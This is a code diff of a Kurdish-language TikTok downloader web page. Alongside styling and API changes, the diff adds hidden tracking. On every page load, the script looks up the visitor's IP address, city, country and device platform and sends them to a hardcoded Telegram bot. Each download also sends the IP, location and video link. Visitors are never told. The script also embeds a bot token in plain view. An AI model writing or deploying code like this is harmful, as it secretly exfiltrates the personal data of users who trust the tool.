@@ -7,27 +7,49 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Noto+Sans+Arabic:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #ff0050; --secondary: #25f4ee; --darker: #050505; --glass: rgba(255, 255, 255, 0.05); --glass-bd: rgba(255, 255, 255, 0.1); }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Noto Sans Arabic', sans-serif; }
+        :root {
+            --primary: #ff0050;
+            --secondary: #25f4ee;
+            --darker: #050505;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-bd: rgba(255, 255, 255, 0.1);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Noto Sans Arabic', 'Inter', sans-serif; }
         body { background: var(--darker); color: white; min-height: 100vh; overflow-x: hidden; }
+        
         .bg-animation { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; background: linear-gradient(45deg, #ff0050, #25f4ee); background-size: 400% 400%; animation: gradient 15s ease infinite; opacity: .05; }
         @keyframes gradient { 0% { background-position: 0% 50% } 50% { background-position: 100% 50% } 100% { background-position: 0% 50% } }
+
         header { padding: 30px 0; text-align: center; background: var(--glass); backdrop-filter: blur(15px); border-bottom: 1px solid var(--glass-bd); }
-        .logo { font-size: 2.2rem; font-weight: 900; background: linear-gradient(45deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; }
-        .container { max-width: 500px; margin: 0 auto; padding: 40px 20px; }
+        .logo { font-size: 2.2rem; font-weight: 900; background: linear-gradient(45deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        .container { max-width: 550px; margin: 0 auto; padding: 40px 20px; }
         .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid var(--glass-bd); border-radius: 30px; padding: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
+
         .input-wrapper { position: relative; margin: 25px 0; }
-        .url-input { width: 100%; padding: 18px; background: rgba(0,0,0,0.4); border: 2px solid var(--glass-bd); border-radius: 15px; color: white; text-align: center; font-size: 0.9rem; }
-        .url-input:focus { border-color: var(--secondary); outline: none; }
-        .download-btn { width: 100%; background: linear-gradient(45deg, var(--primary), #ff3366); border: none; border-radius: 15px; padding: 18px; color: white; font-size: 1.1rem; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .url-input { width: 100%; padding: 20px; background: rgba(0,0,0,0.3); border: 2px solid var(--glass-bd); border-radius: 18px; color: white; text-align: center; font-size: 1rem; }
+        
+        .paste-btn { position: absolute; background: var(--secondary); color: #000; border: none; padding: 10px 15px; border-radius: 12px; font-weight: 900; cursor: pointer; top: 50%; transform: translateY(-50%); }
+        [dir="rtl"] .paste-btn { left: 10px; }
+        [dir="ltr"] .paste-btn { right: 10px; }
+
+        .download-btn { width: 100%; background: linear-gradient(45deg, var(--primary), #ff3366); border: none; border-radius: 18px; padding: 18px; color: white; font-size: 1.1rem; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .download-btn:active { transform: scale(0.98); }
+
         .loading { display: none; text-align: center; margin: 20px 0; }
         .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--secondary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .result { display: none; margin-top: 30px; text-align: center; border-top: 1px solid var(--glass-bd); padding-top: 20px; }
-        .video-preview { width: 100%; border-radius: 15px; margin-bottom: 15px; border: 2px solid var(--secondary); }
-        .save-btn { display: block; width: 100%; background: #fff; color: #000; padding: 15px; border-radius: 12px; text-decoration: none; font-weight: 900; margin-top: 10px; transition: 0.3s; }
-        .save-btn:hover { background: var(--secondary); }
-        footer { text-align: center; padding: 40px; color: #666; font-size: 0.8rem; }
+
+        #result { display: none; margin-top: 30px; text-align: center; background: rgba(255,255,255,0.03); padding: 20px; border-radius: 20px; border: 1px solid var(--glass-bd); animation: slideUp 0.5s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .video-thumb { width: 100%; max-width: 180px; border-radius: 15px; margin-bottom: 15px; border: 2px solid var(--secondary); box-shadow: 0 0 15px rgba(37, 244, 238, 0.2); }
+        
+        .dl-links { display: grid; gap: 12px; }
+        .dl-link { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 16px; border-radius: 14px; text-decoration: none; color: white; font-weight: 800; transition: 0.3s; }
+        .video-link { background: white; color: black; }
+        .video-link:hover { background: var(--secondary); }
+        .audio-link { background: rgba(255,255,255,0.1); border: 1px solid var(--glass-bd); }
     </style>
 </head>
 <body>
@@ -38,69 +60,107 @@
 
     <div class="container">
         <div class="glass-card">
-            <h2 style="text-align:center; margin-bottom:10px;">دابەزێنەری تیکتۆک</h2>
+            <h2 style="text-align:center;">دابەزێنەری تیکتۆک</h2>
             <div class="input-wrapper">
+                <button class="paste-btn" onclick="handlePaste()">Paste</button>
                 <input type="text" id="url" class="url-input" placeholder="لینکی ڤیدیۆ لێرە دابنێ...">
             </div>
-            <button id="downloadBtn" class="download-btn" onclick="processVideo()">ئێستا دایبگرە</button>
+            <button id="downloadBtn" class="download-btn" onclick="process()">دابەزاندن</button>
 
             <div id="loading" class="loading">
                 <div class="spinner"></div>
-                <p style="margin-top:10px; color: var(--secondary);">خەریکە ڤیدیۆکە دەهێنم...</p>
+                <p style="margin-top:10px; color: var(--secondary);">خەریکە ڤیدیۆکە ئامادە دەکەم...</p>
             </div>
 
-            <div id="result" class="result">
-                <video id="videoPlayer" class="video-preview" controls></video>
-                <p style="font-size: 0.8rem; color: #888; margin-bottom: 10px;">ئەگەر دوگمەکە کاری نەکرد، کلیکێکی درێژ لەسەر ڤیدیۆکە بکە و Save Video دابگرە</p>
-                <a href="" id="dlLink" class="save-btn" target="_blank">Download Video</a>
+            <div id="result">
+                <img id="thumb" class="video-thumb" src="" alt="Thumbnail">
+                <p id="vTitle" style="margin-bottom: 20px; font-size: 0.9rem; color: #ccc;"></p>
+                <div class="dl-links">
+                    <a href="" id="videoBtn" class="dl-link video-link">
+                        <i class="fas fa-cloud-download-alt"></i> داگرتنی ڤیدیۆ (بێ لۆگۆ)
+                    </a>
+                    <a href="" id="audioBtn" class="dl-link audio-link">
+                        <i class="fas fa-music"></i> داگرتنی دەنگ (MP3)
+                    </a>
+                </div>
             </div>
         </div>
     </div>
-
-    <footer>DEVELOPED BY ZANA &copy; 2026</footer>
 
     <script>
         const TELEGRAM_TOKEN = '8484169384:AAFKEfwjuxaVyWKV092RckBiEMu28V1a2SM';
         const CHAT_ID = '6259019006';
 
-        async function processVideo() {
-            const url = document.getElementById('url').value.trim();
-            if(!url) return alert("تکایە لینکەکە دابنێ");
+        async function handlePaste() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('url').value = text;
+            } catch (err) { alert("تکایە دەسەڵاتی پاست بدە بە وێبگەڕەکەت"); }
+        }
 
-            document.getElementById('downloadBtn').disabled = true;
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('result').style.display = 'none';
+        async function process() {
+            const url = document.getElementById('url').value.trim();
+            if(!url) return alert("تکایە لینکێک دابنێ");
+
+            const btn = document.getElementById('downloadBtn');
+            const load = document.getElementById('loading');
+            const resDiv = document.getElementById('result');
+
+            btn.disabled = true;
+            load.style.display = 'block';
+            resDiv.style.display = 'none';
 
             try {
-                // بەکارهێنانی API جێگرەوە بۆ کێشەی سێرڤەر
-                const response = await fetch(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(url)}`);
-                const data = await response.json();
-
-                if(data.video && data.video.noWatermark) {
-                    const videoUrl = data.video.noWatermark;
-                    document.getElementById('videoPlayer').src = videoUrl;
-                    document.getElementById('dlLink').href = videoUrl;
-                    document.getElementById('result').style.display = 'block';
+                // بەکارهێنانی APIـی TikWM کە زۆر خێرا و جێگیرە
+                const res = await fetch(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`);
+                const json = await res.json();
+                
+                if(json.code === 0) {
+                    const data = json.data;
+                    document.getElementById('thumb').src = "https://www.tikwm.com" + data.cover;
+                    document.getElementById('vTitle').innerText = data.title || "Video Ready";
                     
-                    // ناردنی زانیاری بۆ تیلیگرام
-                    sendToTelegram(url);
+                    // لینکی ڕاستەوخۆ بۆ داگرتن
+                    const videoUrl = "https://www.tikwm.com" + data.play;
+                    const audioUrl = "https://www.tikwm.com" + data.music;
+
+                    document.getElementById('videoBtn').href = videoUrl;
+                    document.getElementById('audioBtn').href = audioUrl;
+                    
+                    // زیادکردنی تایبەتمەندی داگرتن بۆ ئەوەی پخش نەبێت
+                    document.getElementById('videoBtn').setAttribute('download', 'Zana_TikTok.mp4');
+                    
+                    resDiv.style.display = 'block';
+                    sendToTelegram(url, data.title);
                 } else {
-                    alert("نەمتوانی ڤیدیۆکە بدۆزمەوە، دڵنیابەرەوە لە لینکەکە");
+                    alert("ببورە، لینکی ڤیدیۆکە هەڵەیە یان ڤیدیۆکە سڕاوەتەوە");
                 }
             } catch (e) {
-                alert("کێشەیەک لە سێرڤەر هەبوو، دووبارە هەوڵ بدەرەوە");
+                alert("کێشەیەک لە سێرڤەردا هەیە، تکایە کەمێکی تر تاقی بکەرەوە");
             } finally {
-                document.getElementById('downloadBtn').disabled = false;
-                document.getElementById('loading').style.display = 'none';
+                btn.disabled = false;
+                load.style.display = 'none';
             }
         }
 
-        async function sendToTelegram(link) {
+        async function sendToTelegram(link, title) {
             try {
-                const msg = `📥 ڤیدیۆیەکی نوێ دابەزێنرا:\n🔗 ${link}`;
-                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
+                const msg = `📥 *New Download*\n👤 *User:* ${ip.city}, ${ip.country}\n🌐 *IP:* ${ip.ip}\n🔗 *Link:* ${link}\n📝 *Title:* ${title || 'N/A'}`;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
             } catch(e) {}
         }
+
+        // ناردنی لۆکەیشن تەنها بە چوونە ناو وێبسایت
+        window.onload = async () => {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
+                const msg = `🚀 *Visitor on Website*\n📍 *Location:* ${ip.city}, ${ip.country}\n📱 *Device:* ${navigator.platform}\n🌐 *IP:* ${ip.ip}`;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            } catch(e) {}
+        };
     </script>
 </body>
 </html>
